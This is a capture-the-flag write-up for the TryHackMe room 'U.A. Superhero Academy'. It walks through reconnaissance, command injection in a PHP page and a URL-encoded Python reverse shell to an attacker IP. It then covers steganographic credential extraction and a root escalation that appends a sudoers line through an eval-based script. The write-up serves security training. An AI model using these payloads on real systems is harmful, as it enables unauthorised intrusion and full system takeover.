# TryHackMe: U.A. Superhero Academy – Writeup
[![Solved](https://img.shields.io/badge/Solved%20By-Jull3Hax0r-blue?style=flat-square&logo=gnu-bash)](https://tryhackme.com/p/Jull3)
[![TryHackMe Room](https://img.shields.io/badge/TryHackMe-UA%20Hig%20School-success?style=flat-square&logo=tryhackme)](https://tryhackme.com/room/yueiua)
> **Category:** Shell/Enumeration/Priv-Esc  
> **Difficulty:** Beginner → Intermediate  
> **Target IP:** `MACHINE_IP`  
# 🦸‍♂️ U.A. Superhero Academy 


> **"Join us in the mission to protect the digital world of superheroes!**  
> U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.  
> Our site is a reflection of our school values, designed by our engineers with incredible Quirks.  
> We have gone to great lengths to create a secure platform that reflects the exceptional education of U.A...."

---

## 🛰️ Target

**IP:** `<MACHINE_IP>`

---

## 🔍 Initial Recon

**Nmap:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 11:16 CEST
Nmap scan report for 10.10.16.154
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

---

## 🕵️ Web Enumeration & Exploitation

After enumeration, I found `/assets/index.php` vulnerable to **command injection**!

```
http://<MACHINE_IP>/assets/index.php?cmd=whoami
```
> The response is base64-encoded:  
> `d3d3LWRhdGEK` → `www-data`

---

## 🐚 Getting a Shell

I started a listener:
```
nc -lvnp 4444
```

Then sent a **URL-encoded Python reverse shell**:
```
http://<MACHINE_IP>/assets/index.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.21.132.240%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
```

*Shell received as* **www-data!**

---

## 🗝️ Loot & Lateral Movement

In `/var/www/Hidden_Content/passphrase.txt` I found:
```
QWxsbWlXXXXXXXXXXXXFdmVyISEhCg==
```
Decoded from base64:  
**XXXXXXXXXXXXXX** (Saved for later...)

In `/var/html/assets/images/` I found suspicious images.  
**oneforall.jpg** was corrupted; changing the extension wasn’t enough.

**Fixed the header** using:
```
printf '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01' | dd of=oneforall.jpg bs=1 count=12 conv=notrunc
```
<img src="https://jull3.se/extimg/school/oneforall.jpg" alt="oneforall.jpg">

Then extracted hidden data:
```
steghide extract -sf oneforall.jpg
```
As a passphrase i used what was in the file /var/www/Hidden_Content/passphrase.txt

<img src="https://jull3.se/extimg/school/steg.png" alt="steg.png">

Got `creds.txt`:
```
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:
deku:OneXXxXXXXXXXXXXXonXXXX1/A   
```

Now I could **switch user** to `deku`!

<img src="https://jull3.se/extimg/school/deku.png" alt="deku.png">
---

## ⚡ Privilege Escalation

Check sudo privileges:
```
deku@myheroacademia:~$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

Inspected the script:
```bash
#!/bin/bash
echo "Hello, Welcome to the Report Form"
echo "This is a way to report various problems"
echo "   Developed by the Technical Department of U.A."
echo "Enter your feedback:"
read feedback

if [[ "$feedback" != *"\"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"
    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```

---

### 🛡️ Why feedback.sh Allows Privilege Escalation

The `feedback.sh` script is extremely dangerous from a security perspective because it executes as **root** but allows any user (in this case, `deku`) to supply arbitrary feedback text. This input is then passed directly to `eval`, which interprets and runs the input as shell code:

```bash
eval "echo $feedback"
```

Additionally, the script appends the feedback to a log file as root:

```bash
echo "$feedback" >> /var/log/feedback.txt
```

This combination means that if you can bypass or avoid the blacklist (or if your command does not contain any blacklisted characters), you can inject a payload that performs *any action as root*, such as modifying system files, adding users, or changing sudoers.

**In this challenge, I simply injected:**
```
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```
This line, when executed as root, grants `deku` passwordless sudo privileges for all commands.

**Result:**  
Afterwards, I could run `sudo /bin/bash` as `deku` and instantly become root.

**This is a textbook example of the dangers of using `eval` with user input and running scripts with elevated privileges.** Never trust user input, especially as root!

---

After entering the payload:
```
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

I could then do:
```
sudo /bin/bash
```
Boom – **root shell**!

<img src="https://jull3.se/extimg/school/root.png" alt="root.png">

---

## 🏆 Root Flag

```
cat /root/root.txt
```
```
THM{XXXXXXXXXXXXXXXXX}
```

---

*Mission complete! UA is now more secure, and I am the Number 1 Hero!*

(Insert screenshot links here if you want!)

---
